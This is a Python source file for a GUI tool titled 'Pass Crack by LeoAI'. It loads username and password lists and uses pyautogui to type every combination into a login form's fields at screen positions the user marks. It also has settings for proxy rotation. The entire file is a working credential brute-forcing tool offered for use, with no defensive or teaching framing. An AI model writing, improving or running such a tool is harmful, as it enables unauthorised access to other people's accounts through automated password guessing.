import tkinter as tk
from tkinter import filedialog, messagebox
import pyautogui
import time
import threading
import keyboard

class LoginBot:
    def __init__(self, root):
        self.root = root
        self.root.title("Pass Crack by LeoAI")

        self.username_file_path = ""
        self.password_file_path = ""
        self.proxy_file_path = ""
        self.max_proxy_attempts = 3

        self.green_dot_position = (100, 100)
        self.red_dot_position = (200, 200)
        self.blue_dot_position = (300, 300)

        self.screen_width, self.screen_height = pyautogui.size()

        self.create_ui()

        self.bot_running = False
        keyboard.add_hotkey('up', self.toggle_login_process)  # Toggle the bot using Up Arrow

    def create_ui(self):
        self.root.config(bg='#2f3136')

        title_label = tk.Label(self.root, text="Login Bot", font=("Arial", 14, "bold"), fg="white", bg="#2f3136")
        title_label.pack(pady=10)

        tk.Button(self.root, text="Select Usernames", command=self.select_username_file, bg="#7289da", fg="white").pack(pady=5)
        tk.Button(self.root, text="Select Passwords", command=self.select_password_file, bg="#7289da", fg="white").pack(pady=5)

        self.username_label = tk.Label(self.root, text="No username file selected", fg="white", bg="#2f3136")
        self.username_label.pack()

        self.password_label = tk.Label(self.root, text="No password file selected", fg="white", bg="#2f3136")
        self.password_label.pack()

        tk.Button(self.root, text="Set Dots", command=self.show_dot_overlay, bg="#7289da", fg="white").pack(pady=5)

        tk.Label(self.root, text="Login Speed (milliseconds)", fg="white", bg="#2f3136").pack(pady=5)
        self.speed_entry = tk.Entry(self.root, width=10)
        self.speed_entry.insert(0, "1000")
        self.speed_entry.pack(pady=5)

        tk.Button(self.root, text="Select Proxy List", command=self.select_proxy_file, bg="#7289da", fg="white").pack(pady=5)

        self.proxy_label = tk.Label(self.root, text="No proxy list selected", fg="white", bg="#2f3136")
        self.proxy_label.pack()

        tk.Label(self.root, text="Proxy attempts before switch", fg="white", bg="#2f3136").pack(pady=5)
        self.proxy_attempts_entry = tk.Entry(self.root, width=10)
        self.proxy_attempts_entry.insert(0, str(self.max_proxy_attempts))
        self.proxy_attempts_entry.pack(pady=5)

        self.toggle_label = tk.Label(self.root, text="Press up arrow to toggle", font=("Arial", 12, "bold"), fg="white", bg="#2f3136")
        self.toggle_label.pack(pady=20)

    def select_username_file(self):
        self.username_file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if self.username_file_path:
            self.username_label.config(text=f"Username file: {self.username_file_path}")

    def select_password_file(self):
        self.password_file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if self.password_file_path:
            self.password_label.config(text=f"Password file: {self.password_file_path}")

    def select_proxy_file(self):
        self.proxy_file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if self.proxy_file_path:
            self.proxy_label.config(text=f"Proxy list file: {self.proxy_file_path}")

    def show_dot_overlay(self):
        overlay = tk.Toplevel(self.root)
        overlay.overrideredirect(True)
        overlay.geometry(f"{self.screen_width}x{self.screen_height}+0+0")
        overlay.attributes("-topmost", True)
        overlay.wm_attributes("-transparentcolor", "white")

        canvas = tk.Canvas(overlay, bg="white", highlightthickness=0)
        canvas.pack(fill="both", expand=True)

        drag_data = {"item": None, "x": 0, "y": 0}

        def on_start_drag(event):
            item = canvas.find_closest(event.x, event.y)[0]
            drag_data["item"] = item
            drag_data["x"] = event.x
            drag_data["y"] = event.y

        def on_drag(event):
            dx = event.x - drag_data["x"]
            dy = event.y - drag_data["y"]
            canvas.move(drag_data["item"], dx, dy)
            drag_data["x"] = event.x
            drag_data["y"] = event.y

            coords = canvas.coords(drag_data["item"])
            cx = (coords[0] + coords[2]) // 2
            cy = (coords[1] + coords[3]) // 2

            tag = canvas.gettags(drag_data["item"])[0]
            if tag == "green":
                self.green_dot_position = (cx, cy)
            elif tag == "red":
                self.red_dot_position = (cx, cy)
            elif tag == "blue":
                self.blue_dot_position = (cx, cy)

        def create_dot(x, y, color, tag):
            dot = canvas.create_oval(x - 15, y - 15, x + 15, y + 15, fill=color, outline="", tags=tag)
            canvas.tag_bind(dot, "<ButtonPress-1>", on_start_drag)
            canvas.tag_bind(dot, "<B1-Motion>", on_drag)

        create_dot(*self.green_dot_position, "green", "green")
        create_dot(*self.red_dot_position, "red", "red")
        create_dot(*self.blue_dot_position, "blue", "blue")

    def toggle_login_process(self):
        if self.bot_running:
            self.stop_login_process()
        else:
            self.start_login_process()

    def start_login_process(self):
        if not self.username_file_path or not self.password_file_path:
            messagebox.showerror("Error", "Please select both username and password files.")
            return

        self.bot_running = True
        threading.Thread(target=self.login_loop).start()

    def stop_login_process(self):
        self.bot_running = False

    def login_loop(self):
        try:
            speed = int(self.speed_entry.get())
            proxy_attempts = int(self.proxy_attempts_entry.get())

            with open(self.username_file_path, 'r', encoding='utf-8', errors='ignore') as usernames, \
                 open(self.password_file_path, 'r', encoding='utf-8', errors='ignore') as passwords:
                user_list = usernames.read().splitlines()
                pass_list = passwords.read().splitlines()

                for username in user_list:
                    for password in pass_list:
                        if not self.bot_running:
                            return

                        # Move to username field (green dot), click, and type
                        pyautogui.moveTo(self.green_dot_position[0] + 20, self.green_dot_position[1])
                        pyautogui.click()
                        time.sleep(0.1)
                        pyautogui.write(username, interval=0.005)
                        time.sleep(0.1)

                        # Move to password field (red dot), click, and type
                        pyautogui.moveTo(self.red_dot_position[0] + 20, self.red_dot_position[1])
                        pyautogui.click()
                        time.sleep(0.1)
                        pyautogui.write(password, interval=0.005)
                        time.sleep(0.1)

                        # Move to login button (blue dot), click
                        pyautogui.moveTo(self.blue_dot_position[0] + 20, self.blue_dot_position[1])
                        pyautogui.click()

                        time.sleep(speed / 1000.0)

        except Exception as e:
            messagebox.showerror("Error", f"An error occurred during the login process: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("400x500")
    app = LoginBot(root)
    root.mainloop()
